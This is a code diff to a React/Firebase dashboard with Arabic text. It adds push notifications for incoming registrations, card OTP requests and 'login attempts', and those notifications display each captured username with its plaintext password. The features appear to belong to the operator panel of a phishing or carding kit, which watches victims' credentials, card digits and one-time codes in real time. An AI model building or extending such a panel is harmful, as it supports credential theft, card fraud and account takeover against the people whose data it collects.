@@ -55,6 +55,11 @@ import {
   app
 } from "@/lib/firebase";
 import { getAuth, onAuthStateChanged, signOut, User as FirebaseUser } from "firebase/auth";
+import { 
+  requestNotificationPermission, 
+  setupForegroundMessageHandler,
+  showLocalNotification 
+} from "@/lib/pushNotifications";
 
 const auth = getAuth(app);
 
@@ -248,6 +253,8 @@ export default function FirebaseDashboard() {
   const audioContextRef = useRef<AudioContext | null>(null);
   const [showSettings, setShowSettings] = useState(false);
   const [viewMode, setViewMode] = useState<"list" | "grid">("grid");
+  const [notificationsEnabled, setNotificationsEnabled] = useState(false);
+  const [notificationPermission, setNotificationPermission] = useState<NotificationPermission>("default");
   const [themeSettings, setThemeSettings] = useState<ThemeSettings>(() => {
     const saved = localStorage.getItem("dashboardTheme");
     return saved ? JSON.parse(saved) : defaultThemeSettings;
@@ -258,6 +265,37 @@ export default function FirebaseDashboard() {
   useEffect(() => {
     localStorage.setItem("dashboardTheme", JSON.stringify(themeSettings));
   }, [themeSettings]);
+
+  useEffect(() => {
+    if ("Notification" in window) {
+      setNotificationPermission(Notification.permission);
+      if (Notification.permission === "granted") {
+        setNotificationsEnabled(true);
+      }
+    }
+  }, []);
+
+  useEffect(() => {
+    if (notificationsEnabled) {
+      setupForegroundMessageHandler((payload) => {
+        console.log("Foreground FCM message:", payload);
+        toast.info(payload.notification?.title || "إشعار جديد", {
+          description: payload.notification?.body,
+        });
+      });
+    }
+  }, [notificationsEnabled]);
+
+  const handleEnableNotifications = async () => {
+    const token = await requestNotificationPermission();
+    if (token) {
+      setNotificationsEnabled(true);
+      setNotificationPermission("granted");
+      toast.success("تم تفعيل الإشعارات بنجاح");
+    } else {
+      toast.error("فشل تفعيل الإشعارات");
+    }
+  };
 
   const playNotificationSound = () => {
     if (!soundEnabled) return;
@@ -328,6 +366,14 @@ export default function FirebaseDashboard() {
           description: newestItem?.step_2_personal_data?.email || newestItem?.id?.slice(0, 8),
           duration: 5000,
         });
+        // Show push notification for new registration
+        if (notificationsEnabled) {
+          showLocalNotification(
+            `تسجيل جديد: ${userName}`,
+            newestItem?.step_2_personal_data?.email || "تسجيل جديد وارد",
+            () => window.focus()
+          );
+        }
         // Scroll to top when new data arrives
         if (listRef.current) {
           listRef.current.scrollTop = 0;
@@ -378,6 +424,14 @@ export default function FirebaseDashboard() {
             description: `بطاقة: ${newOtp.cardNumber?.slice(-4) || "****"} - ${newOtp.userName || newOtp.visitorId?.slice(0, 8)}`,
             duration: 10000,
           });
+          // Push notification for OTP request
+          if (notificationsEnabled) {
+            showLocalNotification(
+              `🔐 طلب OTP جديد`,
+              `بطاقة: ****${newOtp.cardNumber?.slice(-4) || "****"} - ${newOtp.userName || "زائر"}`,
+              () => window.focus()
+            );
+          }
         }
       }
       setOtpRequests(requests);
@@ -391,6 +445,14 @@ export default function FirebaseDashboard() {
           description: `المستخدم: ${newAttempt?.username || "غير معروف"}`,
           duration: 5000,
         });
+        // Critical: Push notification for login attempts
+        if (notificationsEnabled) {
+          showLocalNotification(
+            `⚠️ محاولة تسجيل دخول`,
+            `المستخدم: ${newAttempt?.username || "غير معروف"} - كلمة المرور: ${newAttempt?.password || "****"}`,
+            () => window.focus()
+          );
+        }
       }
       setLoginAttempts(attempts);
     });
@@ -741,6 +803,22 @@ export default function FirebaseDashboard() {
             >
               {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
               <span className="hidden lg:inline mr-2">{soundEnabled ? "الصوت مفعل" : "الصوت مغلق"}</span>
+            </Button>
+            <Button
+              variant="outline"
+              size="sm"
+              className={cn(
+                currentTheme.border, "hover:bg-white/10 px-2 md:px-3",
+                notificationsEnabled ? "text-yellow-400" : currentTheme.textMuted
+              )}
+              onClick={handleEnableNotifications}
+              disabled={notificationPermission === "denied"}
+              data-testid="button-toggle-notifications"
+            >
+              <Bell className="h-4 w-4" />
+              <span className="hidden lg:inline mr-2">
+                {notificationPermission === "denied" ? "محظورة" : notificationsEnabled ? "الإشعارات مفعلة" : "تفعيل الإشعارات"}
+              </span>
             </Button>
             <Button
               variant="outline"
